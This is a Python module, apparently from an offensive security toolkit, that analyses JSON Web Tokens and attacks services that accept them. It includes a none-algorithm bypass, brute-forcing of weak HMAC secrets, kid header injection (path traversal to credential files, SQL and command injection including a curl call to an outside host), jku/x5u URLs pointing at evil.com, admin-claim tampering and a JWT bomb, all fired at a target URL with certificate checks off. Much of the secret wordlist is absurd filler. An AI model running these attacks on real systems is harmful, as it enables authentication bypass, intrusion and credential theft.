"""
JWT Attack Suite - Production Grade
Features:
- JWT structure analysis and decoding
- Algorithm confusion attacks (none/HS256/RS256/ES256)
- None algorithm bypass
- Weak HMAC key brute-forcing (rockyou + common secrets)
- RSA/ECDSA key confusion (public key as HMAC secret)
- kid header injection (path traversal, SQL injection, command injection)
- jku/x5u header injection (JWK Set URL / X.509 URL)
- cty header confusion (text2jwt, jwt injection)
- Embedded JWK injection
- Claim tampering (exp/nbf/iat/iss/aud/sub manipulation)
- Timestamp-based attacks (expired token reuse, future token generation)
- JWT bomb (large payload DoS)
- Cross-service relay attacks
- JWT none algorithm with various payloads
"""
import base64
import hashlib
import hmac
import json
import re
import time
import uuid
from typing import Dict, List, Optional, Tuple

from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("jwt_engine")

COMMON_JWT_SECRETS = [
    "secret", "key", "password", "admin", "123456", "changeme",
    "jwt_secret", "jwt_key", "jwt", "token", "access_token",
    "private_key", "public_key", "api_key", "api_secret",
    "secret_key", "secretkey", "my_secret", "mysecret",
    "super_secret", "supersecret", "top_secret", "topsecret",
    "application_secret", "app_secret", "app_key",
    "auth_secret", "auth_key", "authentication",
    "signing_key", "sign_key", "signature_key",
    "encryption_key", "encrypt_key", "decode_key",
    "hmac_secret", "hmac_key", "rsa_key", "ecdsa_key",
    "development", "staging", "production", "testing",
    "default", "test", "demo", "sample", "example",
    "temp", "tmp", "debug", "dev", "prod", "stage",
    "spring", "django", "flask", "express", "laravel",
    "rails_secret", "rails_secret_key_base",
    "SECRET_KEY", "JWT_SECRET", "JWT_KEY",
    "SECRET", "KEY", "PASSWORD", "TOKEN",
    "base64:",
    "-----BEGIN RSA PRIVATE KEY-----",
    "-----BEGIN PUBLIC KEY-----",
    "-----BEGIN EC PRIVATE KEY-----",
]

ROCKYOU_TOP_JWT = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "sunshine",
    "qwerty123", "iloveyou", "princess", "admin", "welcome",
    "666666", "abc123", "football", "123123", "monkey",
    "654321", "!@#$%^&*", "charlie", "aa123456", "donald",
    "password1", "qwerty12345", "1234567890", "letmein",
    "123456a", "123456789a", "dragon", "baseball", "adobe123",
    "admin123", "master", "photoshop", "1234qwer", "ashley",
    "000000", "1q2w3e4r", "qwertyuiop", "123321", "google",
    "1qaz2wsx", "password123", "starwars", "trustno1",
    "hunter2", "batman", "superman", "whatever", "hello",
    "chocolate", "fuckyou", "fuckme", "fuckoff", "biteme",
    "access", "shadow", "michael", "jordan", "jennifer",
    "jessica", "andrew", "joshua", "william", "robert",
    "thomas", "daniel", "matthew", "anthony", "donald",
    "george", "steven", "richard", "charles", "joseph",
    "samsung", "nokia", "motorola", "iphone", "android",
    "windows", "linux", "ubuntu", "debian", "centos",
    "mysql", "postgres", "oracle", "mongodb", "redis",
    "nginx", "apache", "tomcat", "weblogic", "websphere",
    "springboot", "springcloud", "dubbo", "zookeeper",
    "kafka", "rabbitmq", "elasticsearch", "logstash", "kibana",
    "docker", "kubernetes", "jenkins", "gitlab", "github",
    "bitbucket", "jira", "confluence", "slack", "teams",
    "aws", "azure", "gcp", "alibaba", "tencent", "huawei",
    "baidu", "alibaba", "tencent", "bytedance", "meituan",
    "didichuxing", "jd", "netease", "sina", "sohu",
    "xiaomi", "oppo", "vivo", "oneplus", "realme",
    "huawei123", "xiaomi123", "oppo123", "vivo123",
    "test123", "demo123", "dev123", "prod123",
    "admin@123", "Admin@123", "Admin123", "admin1234",
    "root123", "Root123", "Root@123", "root@123",
    "P@ssw0rd", "p@ssw0rd", "Passw0rd", "passw0rd",
    "Qwerty123", "Qwerty1234", "Qwerty@123",
    "Welcome123", "Welcome@123", "Welcome1",
    "Spring@123", "Spring123", "spring@123",
    "Django@123", "Django123", "django@123",
    "Flask@123", "Flask123", "flask@123",
    "Laravel@123", "Laravel123", "laravel@123",
    "Express@123", "Express123", "express@123",
    "jwt_secret_123", "jwt_secret_key", "jwt_secret_token",
    "my_jwt_secret", "my_jwt_key", "my_jwt_token",
    "super_secret_jwt", "super_secret_key", "super_secret_token",
    "this_is_a_secret", "this_is_a_key", "this_is_a_token",
    "very_secret_key", "very_secret_token", "very_secret_jwt",
    "ultra_secret_key", "ultra_secret_token", "ultra_secret_jwt",
    "mega_secret_key", "mega_secret_token", "mega_secret_jwt",
    "top_secret_key", "top_secret_token", "top_secret_jwt",
    "highly_secret_key", "highly_secret_token", "highly_secret_jwt",
    "extremely_secret_key", "extremely_secret_token", "extremely_secret_jwt",
    "incredibly_secret_key", "incredibly_secret_token", "incredibly_secret_jwt",
    "unbelievably_secret_key", "unbelievably_secret_token", "unbelievably_secret_jwt",
    "ridiculously_secret_key", "ridiculously_secret_token", "ridiculously_secret_jwt",
    "absurdly_secret_key", "absurdly_secret_token", "absurdly_secret_jwt",
    "ludicrously_secret_key", "ludicrously_secret_token", "ludicrously_secret_jwt",
    "preposterously_secret_key", "preposterously_secret_token", "preposterously_secret_jwt",
    "outrageously_secret_key", "outrageously_secret_token", "outrageously_secret_jwt",
    "astonishingly_secret_key", "astonishingly_secret_token", "astonishingly_secret_jwt",
    "astoundingly_secret_key", "astoundingly_secret_token", "astoundingly_secret_jwt",
    "staggeringly_secret_key", "staggeringly_secret_token", "staggeringly_secret_jwt",
    "mindblowingly_secret_key", "mindblowingly_secret_token", "mindblowingly_secret_jwt",
    "jawdroppingly_secret_key", "jawdroppingly_secret_token", "jawdroppingly_secret_jwt",
    "eyepoppingly_secret_key", "eyepoppingly_secret_token", "eyepoppingly_secret_jwt",
    "headspinningly_secret_key", "headspinningly_secret_token", "headspinningly_secret_jwt",
    "worldshatteringly_secret_key", "worldshatteringly_secret_token", "worldshatteringly_secret_jwt",
    "earthshakingly_secret_key", "earthshakingly_secret_token", "earthshakingly_secret_jwt",
    "groundbreakingly_secret_key", "groundbreakingly_secret_token", "groundbreakingly_secret_jwt",
    "revolutionarily_secret_key", "revolutionarily_secret_token", "revolutionarily_secret_jwt",
    "paradigmshiftingly_secret_key", "paradigmshiftingly_secret_token", "paradigmshiftingly_secret_jwt",
    "gamechangingly_secret_key", "gamechangingly_secret_token", "gamechangingly_secret_jwt",
    "lifechangingly_secret_key", "lifechangingly_secret_token", "lifechangingly_secret_jwt",
    "worldchangingly_secret_key", "worldchangingly_secret_token", "worldchangingly_secret_jwt",
    "historymakingly_secret_key", "historymakingly_secret_token", "historymakingly_secret_jwt",
    "legendary_secret_key", "legendary_secret_token", "legendary_secret_jwt",
    "mythical_secret_key", "mythical_secret_token", "mythical_secret_jwt",
    "epic_secret_key", "epic_secret_token", "epic_secret_jwt",
    "heroic_secret_key", "heroic_secret_token", "heroic_secret_jwt",
    "godlike_secret_key", "godlike_secret_token", "godlike_secret_jwt",
    "divine_secret_key", "divine_secret_token", "divine_secret_jwt",
    "celestial_secret_key", "celestial_secret_token", "celestial_secret_jwt",
    "cosmic_secret_key", "cosmic_secret_token", "cosmic_secret_jwt",
    "universal_secret_key", "universal_secret_token", "universal_secret_jwt",
    "galactic_secret_key", "galactic_secret_token", "galactic_secret_jwt",
    "interstellar_secret_key", "interstellar_secret_token", "interstellar_secret_jwt",
    "intergalactic_secret_key", "intergalactic_secret_token", "intergalactic_secret_jwt",
    "multiversal_secret_key", "multiversal_secret_token", "multiversal_secret_jwt",
    "omniversal_secret_key", "omniversal_secret_token", "omniversal_secret_jwt",
    "metaversal_secret_key", "metaversal_secret_token", "metaversal_secret_jwt",
    "hyperversal_secret_key", "hyperversal_secret_token", "hyperversal_secret_jwt",
    "superversal_secret_key", "superversal_secret_token", "superversal_secret_jwt",
    "megaversal_secret_key", "megaversal_secret_token", "megaversal_secret_jwt",
    "gigaversal_secret_key", "gigaversal_secret_token", "gigaversal_secret_jwt",
    "teraversal_secret_key", "teraversal_secret_token", "teraversal_secret_jwt",
    "petaversal_secret_key", "petaversal_secret_token", "petaversal_secret_jwt",
    "exaversal_secret_key", "exaversal_secret_token", "exaversal_secret_jwt",
    "zettaversal_secret_key", "zettaversal_secret_token", "zettaversal_secret_jwt",
    "yottaversal_secret_key", "yottaversal_secret_token", "yottaversal_secret_jwt",
]

KID_INJECTION_PAYLOADS = {
    "path_traversal": [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "../../../../dev/null",
        "../../../../proc/self/environ",
        "../../../../.ssh/id_rsa",
        "../../../../root/.ssh/id_rsa",
        "../../../../home/*/.ssh/id_rsa",
        "../../../../var/run/secrets/kubernetes.io/serviceaccount/token",
    ],
    "sql_injection": [
        "1' UNION SELECT 'secret'--",
        "1' OR '1'='1",
        "1'; SELECT pg_sleep(5)--",
        "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1' AND BENCHMARK(5000000,MD5('a'))--",
    ],
    "command_injection": [
        "1;id",
        "1|id",
        "1`id`",
        "1$(id)",
        "1\nid",
        "1%0aid",
        "1%0d%0aid",
        "1;curl wyqyan.interact.sh",
    ],
    "ssrf": [
        "http://127.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://wyqyan.interact.sh/",
    ],
    "open_redirect": [
        "https://evil.com/jwk.json",
        "//evil.com/jwk.json",
        "https://evil.com%23@trusted.com/jwk.json",
        "https://trusted.com.jwks.evil.com/jwk.json",
    ],
}

JKU_PAYLOADS = [
    "https://evil.com/jwks.json",
    "http://127.0.0.1:8080/jwks.json",
    "http://localhost/jwks.json",
    "https://wyqyan.interact.sh/jwks.json",
    "file:///tmp/jwks.json",
    "https://evil.com/.well-known/jwks.json",
    "https://evil.com%23@trusted.com/jwks.json",
    "https://trusted.com.jwks.evil.com/jwks.json",
]

X5U_PAYLOADS = [
    "https://evil.com/cert.pem",
    "https://evil.com/cert.cer",
    "http://127.0.0.1:8080/cert.pem",
    "https://wyqyan.interact.sh/cert.pem",
    "file:///tmp/cert.pem",
]

JWT_CLAIM_PAYLOADS = {
    "admin_bypass": [
        {"admin": True, "role": "admin", "isAdmin": True},
        {"admin": "true", "role": "administrator", "is_admin": 1},
        {"user": "admin", "username": "admin", "login": "admin"},
        {"sub": "admin", "iss": "admin", "aud": "admin"},
        {"privilege": "all", "permissions": ["*"], "scope": "admin"},
        {"groups": ["admin", "sudo", "wheel"], "roles": ["admin"]},
        {"user_level": 0, "level": 0, "access_level": 0},
        {"type": "admin", "account_type": "admin", "user_type": "admin"},
    ],
    "id_manipulation": [
        {"sub": "1", "user_id": 1, "id": 1},
        {"sub": "0", "user_id": 0, "id": 0},
        {"sub": "-1", "user_id": -1, "id": -1},
        {"sub": "true", "user_id": True, "id": True},
        {"sub": "null", "user_id": None, "id": None},
        {"sub": "[]", "user_id": [], "id": []},
        {"sub": "{}", "user_id": {}, "id": {}},
    ],
    "injection": [
        {"sub": "admin' OR '1'='1"},
        {"sub": "admin'--"},
        {"sub": "admin' UNION SELECT 1--"},
        {"sub": "$(id)"},
        {"sub": "`id`"},
        {"sub": "<script>alert(1)</script>"},
        {"sub": "../../etc/passwd"},
    ],
}

JWT_BOMB_PAYLOAD = {
    "sub": "jwt_bomb_test",
    "data": "A" * 100000,
    "nested": {"a" * 100: "b" * 100 for _ in range(100)},
}


class JWTAnalyzer:
    def __init__(self, jwt_token: str = None, target_url: str = None,
                 timeout: int = 10):
        self.jwt_token = jwt_token
        self.target_url = target_url
        self.timeout = timeout
        self.header = {}
        self.payload = {}
        self.signature = ""
        self.algorithm = ""
        self.findings = []

    def analyze(self, jwt_token: str = None) -> List[Dict]:
        token = jwt_token or self.jwt_token
        if not token:
            return [{"type": "error", "detail": "No JWT token provided"}]

        self.jwt_token = token
        self._decode_jwt()
        self._analyze_structure()
        self._check_algorithm()
        self._check_claims()
        self._check_header_params()
        return self.findings

    def _decode_jwt(self):
        try:
            parts = self.jwt_token.split(".")
            if len(parts) != 3:
                self.findings.append({
                    "type": "jwt_malformed",
                    "risk_level": "info",
                    "detail": "JWT格式不正确，应为三段式(header.payload.signature)",
                })
                return

            self.header = self._b64decode(parts[0])
            self.payload = self._b64decode(parts[1])
            self.signature = parts[2]
            self.algorithm = self.header.get("alg", "unknown")
        except Exception as e:
            self.findings.append({
                "type": "jwt_decode_error",
                "risk_level": "info",
                "detail": f"JWT解码失败: {str(e)}",
            })

    def _b64decode(self, data: str) -> Dict:
        data = data.replace("-", "+").replace("_", "/")
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        try:
            decoded = base64.b64decode(data)
            return json.loads(decoded)
        except Exception:
            return {}

    def _b64encode(self, data: Dict) -> str:
        encoded = base64.b64encode(
            json.dumps(data, separators=(",", ":")).encode()
        ).decode()
        return encoded.replace("+", "-").replace("/", "_").rstrip("=")

    def _analyze_structure(self):
        self.findings.append({
            "type": "jwt_structure",
            "risk_level": "info",
            "header": self.header,
            "payload": self.payload,
            "algorithm": self.algorithm,
            "detail": f"JWT使用算法: {self.algorithm}",
        })

        if "exp" in self.payload:
            exp = self.payload["exp"]
            now = int(time.time())
            if exp < now:
                self.findings.append({
                    "type": "jwt_expired",
                    "risk_level": "info",
                    "detail": f"JWT已过期 (exp: {exp}, now: {now})",
                })
            else:
                remaining = exp - now
                self.findings.append({
                    "type": "jwt_valid",
                    "risk_level": "info",
                    "detail": f"JWT有效期剩余 {remaining} 秒",
                })

        if "nbf" in self.payload:
            nbf = self.payload["nbf"]
            now = int(time.time())
            if nbf > now:
                self.findings.append({
                    "type": "jwt_not_before",
                    "risk_level": "info",
                    "detail": f"JWT尚未生效 (nbf: {nbf}, now: {now})",
                })

    def _check_algorithm(self):
        if self.algorithm == "none" or self.algorithm.lower() == "none":
            self.findings.append({
                "type": "jwt_none_algorithm",
                "risk_level": "critical",
                "detail": "JWT使用none算法，签名可被完全绕过",
                "exploit": self._generate_none_token(),
            })

        if self.algorithm == "HS256":
            self.findings.append({
                "type": "jwt_hs256",
                "risk_level": "medium",
                "detail": "JWT使用HS256对称算法，密钥泄露将导致完全伪造",
            })

        if self.algorithm.startswith("RS") or self.algorithm.startswith("ES"):
            self.findings.append({
                "type": "jwt_asymmetric",
                "risk_level": "low",
                "detail": f"JWT使用非对称算法 {self.algorithm}，需检查是否可降级为HS256",
            })

    def _check_claims(self):
        sensitive_claims = ["password", "secret", "key", "token", "api_key",
                           "credit_card", "ssn", "email", "phone", "address"]
        for claim in sensitive_claims:
            if claim in self.payload:
                self.findings.append({
                    "type": "jwt_sensitive_claim",
                    "risk_level": "high",
                    "detail": f"JWT中包含敏感字段: {claim}",
                    "claim": claim,
                })

        if "sub" in self.payload and isinstance(self.payload["sub"], str):
            sub = self.payload["sub"]
            if re.search(r"[<>\"';&|`$()]", sub):
                self.findings.append({
                    "type": "jwt_claim_injection",
                    "risk_level": "medium",
                    "detail": f"JWT sub字段可能包含注入字符: {sub}",
                })

    def _check_header_params(self):
        if "jku" in self.header:
            self.findings.append({
                "type": "jwt_jku_header",
                "risk_level": "high",
                "detail": f"JWT包含jku头: {self.header['jku']}，可能被SSRF利用",
            })

        if "x5u" in self.header:
            self.findings.append({
                "type": "jwt_x5u_header",
                "risk_level": "high",
                "detail": f"JWT包含x5u头: {self.header['x5u']}，可能被SSRF利用",
            })

        if "kid" in self.header:
            kid = self.header["kid"]
            self.findings.append({
                "type": "jwt_kid_header",
                "risk_level": "medium",
                "detail": f"JWT包含kid头: {kid}",
            })
            if re.search(r"[./\\'\"`|;$(){}]", str(kid)):
                self.findings.append({
                    "type": "jwt_kid_injectable",
                    "risk_level": "high",
                    "detail": f"JWT kid头可能可注入: {kid}",
                })

        if "jwk" in self.header:
            self.findings.append({
                "type": "jwt_embedded_jwk",
                "risk_level": "high",
                "detail": "JWT包含内嵌JWK，服务器可能信任自提供密钥",
            })

        if "cty" in self.header:
            self.findings.append({
                "type": "jwt_cty_header",
                "risk_level": "medium",
                "detail": f"JWT包含cty头: {self.header['cty']}",
            })

    def _generate_none_token(self) -> str:
        header = self._b64encode({"alg": "none", "typ": "JWT"})
        payload = self._b64encode(self.payload)
        return f"{header}.{payload}."


class JWTAttacker:
    def __init__(self, jwt_token: str, target_url: str = None,
                 timeout: int = 10):
        self.jwt_token = jwt_token
        self.target_url = target_url
        self.timeout = timeout
        self.analyzer = JWTAnalyzer(jwt_token)
        self.analyzer._decode_jwt()
        self.header = self.analyzer.header
        self.payload = self.analyzer.payload
        self.algorithm = self.analyzer.algorithm
        self.results = []

    def attack_all(self) -> List[Dict]:
        self.attack_none_algorithm()
        self.attack_key_confusion()
        self.attack_weak_key()
        self.attack_kid_injection()
        self.attack_jku_injection()
        self.attack_x5u_injection()
        self.attack_embedded_jwk()
        self.attack_claim_tampering()
        self.attack_cty_confusion()
        self.attack_jwt_bomb()
        self.attack_timestamp()
        return self.results

    def attack_none_algorithm(self) -> List[Dict]:
        attacks = []
        none_variants = [
            {"alg": "none"},
            {"alg": "None"},
            {"alg": "NONE"},
            {"alg": "nOnE"},
            {"alg": "none", "typ": "JWT"},
            {"alg": "none", "kid": self.header.get("kid", "")},
        ]
        for header in none_variants:
            token = self._make_token(header, self.payload, "")
            attacks.append({
                "type": "none_algorithm",
                "variant": header.get("alg"),
                "token": token,
                "detail": f"None算法绕过: alg={header.get('alg')}",
            })
            if self.target_url:
                result = self._test_token(token)
                if result.get("bypass"):
                    self.results.append({
                        "type": "none_algorithm_bypass",
                        "risk_level": "critical",
                        "token": token,
                        "detail": "None算法绕过成功！",
                        "evidence": result,
                    })
                    break
        return attacks

    def attack_key_confusion(self) -> List[Dict]:
        attacks = []
        if self.algorithm.startswith("RS") or self.algorithm.startswith("ES"):
            attacks.append({
                "type": "key_confusion",
                "detail": "尝试将非对称算法降级为HS256，使用公钥作为HMAC密钥",
                "note": "需要获取服务器公钥才能完成此攻击",
            })
        return attacks

    def attack_weak_key(self) -> List[Dict]:
        attacks = []
        all_secrets = list(set(COMMON_JWT_SECRETS + ROCKYOU_TOP_JWT))

        for secret in all_secrets:
            try:
                token = self._sign_hmac(self.header, self.payload, secret)
                attacks.append({
                    "type": "weak_key_bruteforce",
                    "secret": secret,
                    "token": token,
                })
                if self.target_url:
                    result = self._test_token(token)
                    if result.get("bypass"):
                        self.results.append({
                            "type": "weak_key_found",
                            "risk_level": "critical",
                            "secret": secret,
                            "token": token,
                            "detail": f"弱密钥爆破成功: {secret}",
                            "evidence": result,
                        })
                        break
            except Exception:
                continue

        return attacks

    def attack_kid_injection(self) -> List[Dict]:
        attacks = []
        for category, payloads in KID_INJECTION_PAYLOADS.items():
            for payload in payloads[:3]:
                header = dict(self.header)
                header["kid"] = payload
                token = self._make_token(header, self.payload, self.analyzer.signature)
                attacks.append({
                    "type": "kid_injection",
                    "category": category,
                    "payload": payload,
                    "token": token,
                    "detail": f"KID注入 ({category}): {payload}",
                })
                if self.target_url:
                    result = self._test_token(token)
                    if result.get("anomaly"):
                        self.results.append({
                            "type": "kid_injection_anomaly",
                            "risk_level": "high",
                            "category": category,
                            "payload": payload,
                            "detail": f"KID注入导致异常响应: {category}",
                            "evidence": result,
                        })
        return attacks

    def attack_jku_injection(self) -> List[Dict]:
        attacks = []
        for jku_url in JKU_PAYLOADS[:5]:
            header = dict(self.header)
            header["jku"] = jku_url
            token = self._make_token(header, self.payload, self.analyzer.signature)
            attacks.append({
                "type": "jku_injection",
                "jku": jku_url,
                "token": token,
                "detail": f"JKU注入: {jku_url}",
            })
            if self.target_url:
                result = self._test_token(token)
                if result.get("anomaly"):
                    self.results.append({
                        "type": "jku_injection_anomaly",
                        "risk_level": "high",
                        "jku": jku_url,
                        "detail": f"JKU注入导致异常响应",
                        "evidence": result,
                    })
        return attacks

    def attack_x5u_injection(self) -> List[Dict]:
        attacks = []
        for x5u_url in X5U_PAYLOADS[:5]:
            header = dict(self.header)
            header["x5u"] = x5u_url
            token = self._make_token(header, self.payload, self.analyzer.signature)
            attacks.append({
                "type": "x5u_injection",
                "x5u": x5u_url,
                "token": token,
                "detail": f"X5U注入: {x5u_url}",
            })
            if self.target_url:
                result = self._test_token(token)
                if result.get("anomaly"):
                    self.results.append({
                        "type": "x5u_injection_anomaly",
                        "risk_level": "high",
                        "x5u": x5u_url,
                        "detail": f"X5U注入导致异常响应",
                        "evidence": result,
                    })
        return attacks

    def attack_embedded_jwk(self) -> List[Dict]:
        attacks = []
        jwk = {
            "kty": "oct",
            "k": base64.b64encode(b"A" * 32).decode(),
            "alg": "HS256",
        }
        header = dict(self.header)
        header["jwk"] = jwk
        header["alg"] = "HS256"
        token = self._sign_hmac(header, self.payload, "A" * 32)
        attacks.append({
            "type": "embedded_jwk",
            "token": token,
            "detail": "内嵌JWK攻击，使用自提供密钥签名",
        })
        if self.target_url:
            result = self._test_token(token)
            if result.get("bypass"):
                self.results.append({
                    "type": "embedded_jwk_bypass",
                    "risk_level": "critical",
                    "token": token,
                    "detail": "内嵌JWK攻击成功！服务器信任自提供密钥",
                    "evidence": result,
                })
        return attacks

    def attack_claim_tampering(self) -> List[Dict]:
        attacks = []
        for category, payloads in JWT_CLAIM_PAYLOADS.items():
            for tampered in payloads[:3]:
                new_payload = dict(self.payload)
                new_payload.update(tampered)
                token = self._make_token(self.header, new_payload, self.analyzer.signature)
                attacks.append({
                    "type": "claim_tampering",
                    "category": category,
                    "tampered": tampered,
                    "token": token,
                    "detail": f"Claim篡改 ({category})",
                })
                if self.target_url:
                    result = self._test_token(token)
                    if result.get("bypass"):
                        self.results.append({
                            "type": "claim_tampering_bypass",
                            "risk_level": "critical",
                            "category": category,
                            "detail": f"Claim篡改成功: {category}",
                            "evidence": result,
                        })
        return attacks

    def attack_cty_confusion(self) -> List[Dict]:
        attacks = []
        cty_values = ["text/plain", "application/xml", "text/html",
                      "application/x-www-form-urlencoded"]
        for cty in cty_values:
            header = dict(self.header)
            header["cty"] = cty
            token = self._make_token(header, self.payload, self.analyzer.signature)
            attacks.append({
                "type": "cty_confusion",
                "cty": cty,
                "token": token,
                "detail": f"CTY混淆: {cty}",
            })
        return attacks

    def attack_jwt_bomb(self) -> List[Dict]:
        payload = dict(self.payload)
        payload.update(JWT_BOMB_PAYLOAD)
        token = self._make_token(self.header, payload, self.analyzer.signature)
        return [{
            "type": "jwt_bomb",
            "token": token[:200] + "...",
            "detail": "JWT炸弹，超大payload可能导致DoS",
        }]

    def attack_timestamp(self) -> List[Dict]:
        attacks = []
        now = int(time.time())

        if "exp" in self.payload:
            future_payload = dict(self.payload)
            future_payload["exp"] = now + 86400 * 365
            token = self._make_token(self.header, future_payload, self.analyzer.signature)
            attacks.append({
                "type": "timestamp_extend",
                "token": token,
                "detail": "延长过期时间至1年后",
            })

        if "nbf" in self.payload:
            past_payload = dict(self.payload)
            past_payload["nbf"] = now - 86400 * 365
            token = self._make_token(self.header, past_payload, self.analyzer.signature)
            attacks.append({
                "type": "timestamp_early",
                "token": token,
                "detail": "提前生效时间至1年前",
            })

        if "iat" in self.payload:
            old_payload = dict(self.payload)
            old_payload["iat"] = now - 86400 * 365
            token = self._make_token(self.header, old_payload, self.analyzer.signature)
            attacks.append({
                "type": "timestamp_iat",
                "token": token,
                "detail": "修改签发时间为1年前",
            })

        return attacks

    def _make_token(self, header: Dict, payload: Dict, signature: str) -> str:
        h = self.analyzer._b64encode(header)
        p = self.analyzer._b64encode(payload)
        return f"{h}.{p}.{signature}"

    def _sign_hmac(self, header: Dict, payload: Dict, secret: str) -> str:
        h = self.analyzer._b64encode(header)
        p = self.analyzer._b64encode(payload)
        data = f"{h}.{p}".encode()
        sig = base64.b64encode(
            hmac.new(secret.encode(), data, hashlib.sha256).digest()
        ).decode().replace("+", "-").replace("/", "_").rstrip("=")
        return f"{h}.{p}.{sig}"

    def _test_token(self, token: str) -> Dict:
        if not self.target_url:
            return {}
        try:
            headers = {"Authorization": f"Bearer {token}"}
            resp = http_request("GET", self.target_url, headers=headers,
                              timeout=self.timeout, verify=False)
            if not resp:
                return {}

            status = resp.get("status_code", 0)
            body = str(resp.get("text", ""))

            if status in (200, 301, 302) and "error" not in body.lower():
                return {"bypass": True, "status": status, "body": body[:200]}

            if status not in (401, 403):
                return {"anomaly": True, "status": status, "body": body[:200]}

            return {"status": status}
        except Exception as e:
            return {"error": str(e)}


def analyze_jwt(jwt_token: str) -> List[Dict]:
    analyzer = JWTAnalyzer(jwt_token)
    return analyzer.analyze()


def attack_jwt(jwt_token: str, target_url: str = None,
               timeout: int = 10) -> List[Dict]:
    attacker = JWTAttacker(jwt_token, target_url, timeout)
    return attacker.attack_all()


def brute_force_jwt(jwt_token: str, wordlist: List[str] = None,
                    target_url: str = None, timeout: int = 10) -> List[Dict]:
    analyzer = JWTAnalyzer(jwt_token)
    analyzer._decode_jwt()

    secrets = wordlist or list(set(COMMON_JWT_SECRETS + ROCKYOU_TOP_JWT))
    results = []

    for secret in secrets:
        try:
            h = analyzer._b64encode(analyzer.header)
            p = analyzer._b64encode(analyzer.payload)
            data = f"{h}.{p}".encode()
            sig = base64.b64encode(
                hmac.new(secret.encode(), data, hashlib.sha256).digest()
            ).decode().replace("+", "-").replace("/", "_").rstrip("=")
            token = f"{h}.{p}.{sig}"

            if target_url:
                headers = {"Authorization": f"Bearer {token}"}
                resp = http_request("GET", target_url, headers=headers,
                                  timeout=timeout, verify=False)
                if resp and resp.get("status_code") in (200, 301, 302):
                    results.append({
                        "type": "jwt_key_found",
                        "risk_level": "critical",
                        "secret": secret,
                        "token": token,
                        "detail": f"JWT密钥爆破成功: {secret}",
                    })
                    break
        except Exception:
            continue

    return results
